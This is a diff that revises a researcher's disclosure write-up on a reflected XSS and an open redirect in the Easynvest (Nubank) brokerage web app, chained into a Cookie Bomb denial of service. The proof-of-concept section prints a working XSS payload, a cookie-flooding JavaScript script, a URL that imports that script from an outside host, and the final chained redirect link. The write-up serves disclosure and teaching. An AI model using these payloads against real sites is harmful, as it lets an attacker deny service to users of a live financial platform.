@@ -17,7 +17,7 @@ Table of contents:
 
 ### Summary
 
-Through an analysis on the web application of the broker of which I am a client (easynvenst.com.br - acquired by Nubank) I was able to notice certain behaviors that led me to discover two client-side vulnerabilities that, if exploited by an attacker, could expose the legitimate users of the application to various risks, one of which is a kind of "unavailability".
+During a security analysis of the web application operated by easynvest.com.br (acquired by Nubank), two client-side vulnerabilities were identified. When combined, these flaws can be exploited to compromise the availability of the service for legitimate users. Specifically, the attack chain enables a Denial of Service (DoS) condition through client-side exploitation.
 
 Timeline
 
@@ -35,32 +35,28 @@ Timeline
 
 ### Description
 
-Recently while using the app of my Investment Brokerage, I decided to generate an invitation link through the mobile app to send to a friend that resulted in:
+The application includes a feature that generates personalized referral links using URL parameters, as shown in the following example:
 
 ![Imagem](/images/publications/nuinvest/link-indique.png)
 
 [https://indique.easynvest.com.br?nome=heitor%20REDACTED&id=[NUMERICAL ID REDACTED]]()
 
-Out of curiosity, I accessed the invitation link and realized that the app received my name/surname as a parameter in the URL and reflected these values on the user's screen:
-
 ![Imagem](/images/publications/nuinvest/site.png)
 
-Because of that, I thought about the possibility of building an XSS payload that took advantage of this and after a few attempts I managed to arrive at something valid:
+Upon accessing the link, the “?nome=” parameter is directly reflected on the user's screen. This behavior indicates the presence of a reflected Cross-Site Scripting (XSS) vulnerability ([1], [2]). The vulnerability was confirmed with the following payload:
 
 [https://indique.easynvest.com.br/?nome=<audio src/onerror=alert(1)>&id=1]()
 
 ![Imagem](/images/publications/nuinvest/xss-triaged.png)
 
-￼This XSS is somewhat restricted as it has several limitations:
+Although the vulnerability is exploitable, its impact is limited by several factors:
 
-* The first is that it is on a subdomain, which does not give me access to LocalStorage from the main domain;
-* I have access to cookies, however all cookies with sensitive or critical information are set to HTTPOnly;
-* It is of the "Reflected" type which makes it a little more difficult to propagate it;
-* Practically all the useful information is in the main domain, where it has anti-CSRF tokens and correctly configured XFO, CSP and CORS header set.
+* The vulnerable component is hosted on a subdomain, restricting access to LocalStorage on the main domain;
+* Sensitive cookies are protected with the HTTPOnly flag;
+* Being a reflected XSS, it is not easily propagated without user interaction;
+* The main domain enforces strong security policies, including anti-CSRF tokens, and headers such as X-Frame-Options (XFO), Content Security Policy (CSP), and CORS.
 
-Through these limitations I decided that it was feasible to go a little deeper in the search and try to find some other vulnerability that I could use in a chain and be able to minimize these restrictions of this RXSS.
-
-Directing my efforts to the main application, I started reading the JavaScript on the authentication screen and found an interesting parameter that led me to an Open Redirect:
+Given these constraints, the investigation focused on identifying a complementary vulnerability that could be chained with the reflected XSS. Analysis of the authentication page's JavaScript revealed an Open Redirect vulnerability ([3], [4]):
 
 [https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()
 
@@ -68,51 +64,41 @@ Demo:
 
 <iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
-Well, through this Open Redirect in the main domain it is possible to minimize the restriction of spreading a malicious payload, but that still does not solve the other restrictions.
-In search of a way to demonstrate an interesting impact with the combination of this RXSS + Open Redirect, I tried to use them to achieve an Account Takeover, Information Exfiltration and other forms of impact, but this was not possible since the application has a mechanism default MFA for any action that is classified as critical, such as: (a) alteration of email, (b) deletion of the account, (c) transfer/purchase/sale of investment funds; among others.
+This unvalidated redirect on the main domain allows malicious payloads to be delivered more reliably, partially bypassing the limitations of the subdomain-restricted XSS. However, further exploitation aimed at Account Takeover, data exfiltration, or critical actions was unsuccessful due to the application’s enforcement of Multi-Factor Authentication (MFA) for sensitive operations ([7]).
 
-I spent a long time trying to show an interesting "exploitability" that used these two vulnerabilities but I always ran into some security feature that generated an impediment so I made the decision to use these two vulnerabilities to generate a Cookie Bomb attack that would make the application unavailable in case access via a malicious link sent to the user.
-Basically the idea behind a Cookie Bomb attack is to send a request that contains a giant cookie to the application, causing the server to refuse any request from this user and not load the application itself, generating a denial of service.
+As an alternative, the combination of the vulnerabilities was leveraged to perform a Cookie Bomb attack, with the goal of rendering the application unavailable for users who visit a crafted malicious link. The attack involves injecting an excessive number of oversized cookies, surpassing server processing thresholds. As a result, subsequent requests from the affected browser are rejected, causing the application to fail to load—effectively creating a client-specific Denial of Service condition. Modern browsers typically allow multiple cookies, each up to ~4KB in size. However, most servers are not designed to handle unusually large volumes of cookie data, leading to application inaccessibility until the user manually clears the cookies or they expire.
 
-A cookie has a 4k byte limit by default, it is possible to create many cookies and send them through the browser request, however the servers do not react very well to this type of scenario which makes the application inactive for the time determined by the cookie, or until the user manually removes the gigantic cookies.
-
-If you are more interested in this vulnerability, I recommend reading the following articles: [[9] - "Cookie Bomb or lets break the Internet." by Egor Homakov](#references) and [[10] - "Denial of Service with Cookie Bomb" by filedescriptor](#reference) in the references section.
+For in-depth understanding, refer to: "Cookie Bomb or Let's Break the Internet" [9] by Egor Homakov "Denial of Service with Cookie Bomb" [10] by filedescriptor.
 
 ---
 
 ### Proof of Concept
 
-In practice the exploit would look like this:
+The exploitation chain proceeds as follows:
 
-1. First we need to serve JavaScript on the Internet that makes the creation of cookies in an abusive way for our target:
+1. Host a JavaScript payload to generate oversized cookies:
     
-    -
-    ```javascript
-    var base_domain = document.domain.substr(document.domain.indexOf('.'));
-    var pollution   = Array(4000).join('a');
 
-    for (var i = 1; i < 99; i++) {
-        document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
-    }
+```javascript
+var base_domain = document.domain.substr(document.domain.indexOf('.'));
+var pollution   = Array(4000).join('a');
 
-    window.location="https://" + document.domain;
-    ```
+for (var i = 1; i < 99; i++) {
+    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
+}
+
+window.location="https://" + document.domain;
+```
     
     * Hosted on: [https://heitorgouvea.me/public/payloads/bomb.js](https://heitorgouvea.me/public/payloads/bomb.js)
-    
-    -
 
-2. We need to get our RXSS to read/execute this JavaScript: 
+2. Trigger the script via reflected XSS: 
     
     [https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()
 
-    -
+3. Use an Open Redirect (with a shortened URL) to obfuscate the malicious payload: [https://cutt.ly/syPnJXp]()
 
-3. We need to direct the user to this malicious RXSS in the least suspicious way possible: with a URL shortener we can mask our payload: [https://cutt.ly/syPnJXp]()
-
-    -
-
-The final payload looks like this: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()
+Final chained payload: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()
 
 And this was the result:
 
@@ -122,18 +108,17 @@ And this was the result:
 
 ### Impact
 
-An attacker could use this chain of vulnerabilities to generate several scenarios that present some type of risk to users of the application, and this publication addressed only one of the possible scenarios where it shows the possibility that an attacker would be able to "make" the application unavailable for a certain group of users if they accessed the link sent by it.
+This attack chain enables an adversary to induce localized unavailability of the application for specific users. By exceeding the server's cookie processing capacity, the application becomes unresponsive for the affected user until they clear the injected cookies. While this analysis focused solely on a DoS vector, additional attack scenarios could emerge depending on future application changes or misconfigurations.
 
 ---
 
 ### Conclusion
 
-The effort to carry out this exploration is relatively small and simple, but the scope of this attack is possibly great. An attacker can easily exploit the vulnerabilities mentioned above and thus disseminate a link with a malicious payload that uses the vulnerabilities in this article that generates a denial of service, and it is possible that there are also other vulnerabilities that can be exploited from the scope illustrated here.
+The exploitation described requires relatively low technical effort but can have a notable impact on user experience. By chaining a reflected XSS with an Open Redirect, it is possible to execute a Cookie Bomb attack resulting in targeted denial of service. Although this vector is not commonly exploited in real-world attacks, it is effective under the right conditions.
+Following responsible disclosure, the company took the following actions:
 
-Furthermore, in contact with the company she decided:
-
-1. Don't make a fix for Open Redirect;
-2. The XSS mitigation was done through rules in WaF (I found 3 bypass and tried to argument about that this type of mitigation was not the correct one, but without success);
+* No definitive remediation was applied to the Open Redirect vulnerability;
+* The XSS vulnerability was partially mitigated via Web Application Firewall (WAF) rules, although multiple bypasses were identified. Technical feedback was provided, but no further updates were received.
 
 ---
 
